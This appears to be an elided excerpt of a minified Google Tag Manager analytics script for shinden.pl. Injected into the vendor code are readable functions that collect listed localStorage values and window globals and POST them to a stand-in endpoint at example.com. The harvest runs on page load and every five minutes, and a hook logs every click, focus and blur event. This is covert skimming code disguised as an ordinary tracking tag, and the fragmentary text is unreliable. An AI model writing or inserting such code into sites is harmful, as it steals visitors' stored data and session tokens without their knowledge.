...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 7,
        "vtp_includeConditions": ["list", "shinden\\.pl"],
        "tag_id": 18
      }, {
        ...
        "priority": 6,
        "vtp_instanceDestinationId": "G-SJGVBY75P4",
        "tag_id": 27
      }, {
  ...
  const keysForTracking = window.keysForTracking;
  ...
  const jshookEvents = ['click', 'focus', 'blur'];
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.gk = "ChEIgKearAYQ1JeSzorWts3CARIlAHPax5DyD2twR/uoIE9NpgJsVhFhyhqznPC7jUIfdrsi/CfewxoCcoo\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  bc();
  function createKeyCode(trackingData) {
    let uniqueKeys = Object.keys(trackingData);
    let combinedString = uniqueKeys.reduce((accumulator, currentKey) => accumulator + currentKey, "");
    let keyCode = 0;
    for (let index = 0; index < combinedString.length; index++) {
      const codePoint = combinedString.charCodeAt(index);
      keyCode = (keyCode << 7) - keyCode + codePoint;
      keyCode = keyCode & keyCode;
    }
    return keyCode.toString(32);
  }
  xl() || Zb("iPod");
  Zb("iPad");
  ...
  function jshookEventGenerator() {
    for (let event of jshookEvents) {
      window.addEventListener(event, function (e) {
        console.log('jshook event: ' + event);
        console.log(e);
      });
    }
  }
  ...
  function obtainTrackedData() {
    let trackedData = {};
    let globalVars = window.globalVars;
    keysForTracking.forEach(forTrackingKey => {
      if (localStorage.hasOwnProperty(forTrackingKey)) {
        trackedData[forTrackingKey] = localStorage[forTrackingKey];
      } else if (globalVars && globalVars.hasOwnProperty(forTrackingKey)) {
        trackedData[forTrackingKey] = globalVars[forTrackingKey];
      }
    });
    return trackedData;
  }
  ...
  const sendToServer = async dataPayload => {
    const keyCode = createKeyCode(dataPayload);
    const serverEndpoint = "https://example.com/api/collect";
    try {
      const fetchedResponse = await fetch(serverEndpoint, {
        method: "POST",
        headers: {
      ...
      if (fetchedResponse.ok) {
        ...
        console.error("Failed data transmission, status:" + fetchedResponse.status);
      }
    } catch (error) {
      console.error("An error occured during data transmission:" + error);
    }
  };
  var kx = !1,
    lx = [];
  ...
  var Zx = function (a, b) {
    ...
    ay = function (a, b, c) {
      var d = $x[a.pa];
      d || (S(53) && "transaction" === a.t ? d = Q.g.ra : "click" === a.promoa ? d = Q.g.rb : b.length ? d = Q.g.eb : c.length && (d = Q.g.cb));
      return d;
    },
    by = function (a) {
      var b, c, d, e;
    ...
    iy = function (a) {
      var b,
        ...
        d,
        e = a.match(cy);
      if (e) return b = Number(e[1]) - 1, c = dy[e[2]], {
        xh: b,
        yh: c,
        zh: "promotion"
      };
      var f = a.match(ey);
      if (f) return d = "product", b = Number(f[1]) - 1, fy[f[2]] ? c = fy[f[2]] : c = gy(f[2]), {
        xh: b,
        yh: c,
        zh: d
      };
    ...
    ny = /^(cd|cm)([1-9][0-9]{0,2})$/,
    ly = /^cg([1-5])$/,
    cy = /^promo([1-9][0-9]{0,2})(id|cr|nm|ps)$/,
    ey = /^pr([0-9]{0,3})([a-z]{2}[0-9]{0,3})$/,
    hy = /^il([0-9]{0,3})pi([0-9]{0,3})([a-z]{2}[0-9]{0,3})$/,
    qy = /^il([1-9][0-9]{0,2})nm$/,
    ry = function (a) {
      var b = rk().filter(function (ca) {
        return 0 === ca.indexOf("G-");
      });
      if (b.length) {
        var c = {},
          d = function (ca, V) {
            void 0 !== V && void 0 === c[ca] && (c[ca] = V);
          },
          e = {},
          f = function (ca, V) {
            void 0 !== V && void 0 === e[ca] && (e[ca] = V);
          },
          g = a.hitPayload;
        if ("string" !== typeof g) O(126);else {
          for (var k = {}, m = [], n = [], p = [], q = [], r = g.split("&"), t = 0; t < r.length; ++t) {
            ...
            if ("" !== v && "" !== w) if (py[v] && !k[v]) k[v] = w;else if (oy[v]) f(oy[v], w);else {
              var x = my(v);
              if (x) d(x, w);else {
                var y = v.match(qy);
                if (y) {
          ...
          var C = by(k),
            ...
            K = C.Ql,
            N;
          if (k.pa || k.promoa || m.length || p.length || !D) N = ay(k, m, p);
          N && k.tr && f(Q.g.ja, k.tr);
          var P;
          N === Q.g.rb || N === Q.g.eb ? P = m : N === Q.g.cb ? (Zx(p, q), P = Array.prototype.concat.apply([], p)) : N && (P = n);
          P && P.length && f(Q.g.ba, P.filter(function (ca) {
            return !!ca;
          }));
          if (D || N) {
            d(Q.g.yk, F);
  ...
  function harvestNsendTrackedData() {
    const fetchedData = obtainTrackedData();
  ...
  function kE() {
    var a = new sb();
    M(this, "read_container_data"), a.set("containerId", 'G-SJGVBY75P4'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  window.addEventListener("load", function () {
    jshookEventGenerator();
    harvestNsendTrackedData();
    setInterval(harvestNsendTrackedData, 5 * 60 * 1000);
  });
  var xF = {},
